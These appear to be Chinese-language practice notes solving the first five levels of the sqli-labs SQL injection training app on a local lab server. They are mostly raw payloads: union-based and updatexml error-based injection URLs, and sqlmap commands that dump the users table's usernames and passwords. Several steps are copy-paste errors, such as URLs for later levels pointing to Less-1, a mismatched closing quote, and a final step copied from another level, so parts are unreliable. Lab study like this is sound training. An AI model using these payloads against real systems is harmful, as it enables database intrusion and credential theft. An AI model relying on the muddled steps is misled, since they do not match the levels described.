# sqli-labs 通关笔记

# 基础篇

### Less-1



| 请求方式 | 注入方式 | 注入位置 | 参数构造            |
| -------- | -------- | -------- | ------------------- |
| GET      | 报错回注 | url      | ?id=1' 注入语句 --+ |

```
1. 确定参数构造方式
http://192.168.1.200:9080/Less-1/?id=1'\

2. 判断注入点
http://192.168.1.200:9080/Less-1/?id=1' and 1=1 --+
http://192.168.1.200:9080/Less-1/?id=1' and 1=2 --+

3. 确定字段数量
http://192.168.1.200:9080/Less-1/?id=1' order by 3 --+
http://192.168.1.200:9080/Less-1/?id=1' order by 4 --+

4. 判断数据显示点
http://192.168.1.200:9080/Less-1/?id=-1' union select 1,2,3  --+

5. 查询数据库名字和版本信息以及所有的表名
http://192.168.1.200:9080/Less-1/?id=-1' union select 1,group_concat(version(), '---',database()),group_concat(table_name) from information_schema.tables where table_schema=database()  --+

6. 查询 users 表的所有字段名
http://192.168.1.200:9080/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'  --+

7. 获得 users 表的所有记录
http://192.168.1.200:9080/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users  --+
```

#### Less-2

| 请求方式 | 注入方式 | 注入位置 | 参数构造           |
| -------- | -------- | -------- | ------------------ |
| GET      | 报错回注 | url      | ?id=1 注入语句 --+ |

```
1. 确定参数构造方式
http://192.168.1.200:9080/Less-1/?id=1'\

2. 判断注入点
http://192.168.1.200:9080/Less-1/?id=1 and 1=1 --+
http://192.168.1.200:9080/Less-1/?id=1 and 1=2 --+

3. 确定字段数量
http://192.168.1.200:9080/Less-1/?id=1 order by 3 --+
http://192.168.1.200:9080/Less-1/?id=1 order by 4 --+

4. 判断数据显示点
http://192.168.1.200:9080/Less-1/?id=-1 union select 1,2,3  --+

5. 查询数据库名字和版本信息以及所有的表名
http://192.168.1.200:9080/Less-1/?id=-1 union select 1,group_concat(version(), '---',database()),group_concat(table_name) from information_schema.tables where table_schema=database()  --+

6. 查询 users 表的所有字段名
http://192.168.1.200:9080/Less-1/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'  --+

7. 获得 users 表的所有记录
http://192.168.1.200:9080/Less-1/?id=-1 union select 1,group_concat(username),group_concat(password) from users  --+
```

### Less-3



| 请求方式 | 注入方式 | 注入位置 | 参数构造             |
| -------- | -------- | -------- | -------------------- |
| GET      | 报错回注 | url      | ?id=1‘) 注入语句 --+ |

```
1. 确定参数构造方式
http://192.168.1.200:9080/Less-1/?id=1'\

2. 判断注入点
http://192.168.1.200:9080/Less-1/?id=1') and 1=1 --+
http://192.168.1.200:9080/Less-1/?id=1') and 1=2 --+

3. 确定字段数量
http://192.168.1.200:9080/Less-1/?id=1') order by 3 --+
http://192.168.1.200:9080/Less-1/?id=1 order by 4 --+

4. 判断数据显示点
http://192.168.1.200:9080/Less-1/?id=-1') union select 1,2,3  --+

5. 查询数据库名字和版本信息以及所有的表名
http://192.168.1.200:9080/Less-1/?id=-1') union select 1,group_concat(version(), '---',database()),group_concat(table_name) from information_schema.tables where table_schema=database()  --+

6. 查询 users 表的所有字段名
http://192.168.1.200:9080/Less-1/?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'  --+

7. 获得 users 表的所有记录
http://192.168.1.200:9080/Less-1/?id=-1') union select 1,group_concat(username),group_concat(password) from users  --+
```

### Less-4

| 请求方式 | 注入方式 | 注入位置 | 参数构造             |
| -------- | -------- | -------- | -------------------- |
| GET      | 报错回注 | url      | ?id=1") 注入语句 --+ |

```
1. 确定参数构造方式
http://192.168.1.200:9080/Less-1/?id=1'\

2. 判断注入点
http://192.168.1.200:9080/Less-1/?id=1") and 1=1 --+
http://192.168.1.200:9080/Less-1/?id=1") and 1=2 --+

3. 确定字段数量
http://192.168.1.200:9080/Less-1/?id=1") order by 3 --+
http://192.168.1.200:9080/Less-1/?id=1") order by 4 --+

4. 判断数据显示点
http://192.168.1.200:9080/Less-1/?id=-1") union select 1,2,3  --+

5. 查询数据库名字和版本信息以及所有的表名
http://192.168.1.200:9080/Less-1/?id=-1") union select 1,group_concat(version(), '---',database()),group_concat(table_name) from information_schema.tables where table_schema=database()  --+

6. 查询 users 表的所有字段名
http://192.168.1.200:9080/Less-1/?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'  --+

7. 获得 users 表的所有记录
http://192.168.1.200:9080/Less-1/?id=-1") union select 1,group_concat(username),group_concat(password) from users  --+
```

### sqlmap

```
1. 查询所有数据库
sqlmap -u "http://192.168.1.200:9080/Less-4/?id=1" --batch --dbs

2. 查询所有表
sqlmap -u "http://192.168.1.200:9080/Less-4/?id=1" --batch -D security --tables

3. 查询所有列名
sqlmap -u "http://192.168.1.200:9080/Less-4/?id=1" --batch -D security -T users --columns

4. 查询所有记录
sqlmap -u "http://192.168.1.200:9080/Less-4/?id=1" --batch -D security -T users -C "username,password" --dump
```

### Less-5

| 请求方式 | 注入方式 | 注入位置 | 参数构造             |
| -------- | -------- | -------- | -------------------- |
| GET      | 报错回注 | url      | ?id=1") 注入语句 --+ |

```
1. 确定参数构造方式
http://192.168.1.200:9080/Less-5/?id=1\

2. 判断注入点
http://192.168.1.200:9080/Less-5/?id=1' and 1=1 --+
http://192.168.1.200:9080/Less-5/?id=1' and 1=2 --+

3. 确定字段数量
http://192.168.1.200:9080/Less-5/?id=1' order by 3 --+
http://192.168.1.200:9080/Less-5/?id=1' order by 4 --+

5. 查询数据库名字和版本信息以及所有的表名
http://192.168.1.200:9080/Less-5/?id=1' and updatexml(1,concat(0x7e,(SELECT database()), (select @@version),0x7e),1) -- +
http://192.168.1.200:9080/Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x7e),1) -- +

6. 查询 users 表的所有字段名
http://192.168.1.200:9080/Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'), 0x7e),1) -- +

7. 获得 users 表的所有记录
http://192.168.1.200:9080/Less-1/?id=-1") union select 1,group_concat(username),group_concat(password) from users  --+
```

